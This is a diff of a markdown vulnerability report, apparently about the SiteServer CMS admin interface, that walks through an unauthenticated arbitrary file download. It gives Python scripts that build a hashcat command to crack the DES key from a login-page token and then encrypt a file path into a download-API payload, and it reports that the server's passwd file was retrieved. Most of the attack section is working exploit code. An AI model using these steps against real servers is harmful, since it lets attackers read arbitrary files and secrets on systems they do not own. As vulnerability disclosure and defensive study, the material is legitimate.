@@ -2,12 +2,13 @@ Visit the backend at http://ip/ss-admin/login/
 <img width="693" height="446" alt="image" src="https://github.com/user-attachments/assets/86917f27-4e55-47cb-9bb3-db5e7202477f" />
 
 Right-click on "Check" and navigate to the verification code area as shown below:
+
 <img width="691" height="224" alt="image" src="https://github.com/user-attachments/assets/37ec08d3-e8b0-44a0-860e-0bf081276aed" />
 
 Copy the value of the token again:
 y5WWupq9Uh0slash0X9rQ66OSpKxMH811v8xERFkSwjNy4ZvHr7YQDiEFDM3SocOEZkWZdtrCienNat0i0slash0NPC20slash0Uhtyw0equals00equals00secret0
 Use the following Python script to generate the hashcat command
-
+```shell
 import base64
 def b64_de_replace(txt):
     txt = txt.replace('0secret0', '') 
@@ -39,14 +40,18 @@ if __name__ == "__main__":
     command = generate_hashcat_command(ct, pt_first_block, iv)
     print("Please run the following command to crack the DES key:")
     print(command)
+```
   
 <img width="692" height="81" alt="image" src="https://github.com/user-attachments/assets/2d05e1a7-b3b9-4e80-b695-56b9614c9a46" />
+
 Use hashcat tool to explode the equivalent key:
+
 <img width="692" height="477" alt="image" src="https://github.com/user-attachments/assets/1d3c2596-d06f-428e-9161-9722460358fa" />
 
 Equivalent Key:d3a3d312
-Then use the following Python script to generate the API path for downloading any file
 
+Then use the following Python script to generate the API path for downloading any file
+```shell
 from Crypto.Cipher import DES
 import base64
 def encrypt_string_by_secret_key(input_string, secret_key):
@@ -80,9 +85,23 @@ if encrypted_file_path:
     print("payload:","api/stl/actions/download?filePath="+encrypted_file_path)
 else:
     print("Encryption failed")
+```
 
 <img width="692" height="99" alt="image" src="https://github.com/user-attachments/assets/19c80011-2048-42f3-bc7c-59fee4589d5c" />
 
 visit :http://ip/api/stl/actions/download?filePath=5tckNs4Ydqz58s7VvQ9RxQ0equals00equals00secret0
+
 <img width="692" height="288" alt="image" src="https://github.com/user-attachments/assets/f3e0631f-3fe8-48d1-8f6e-15ef63ef9bfc" />
+
 Successfully downloaded passwd file
+
+Vulnerability code analysis
+
+<img width="1853" height="848" alt="image" src="https://github.com/user-attachments/assets/d9067e96-29b6-4647-b70e-f3f0423267d9" />
+
+No administrator login is required here, as long as the decryption of "FilePath" is successful, any file can be downloaded
+
+<img width="1698" height="757" alt="image" src="https://github.com/user-attachments/assets/4465a35f-673b-482f-b94c-4a6becb89dce" />
+
+
+
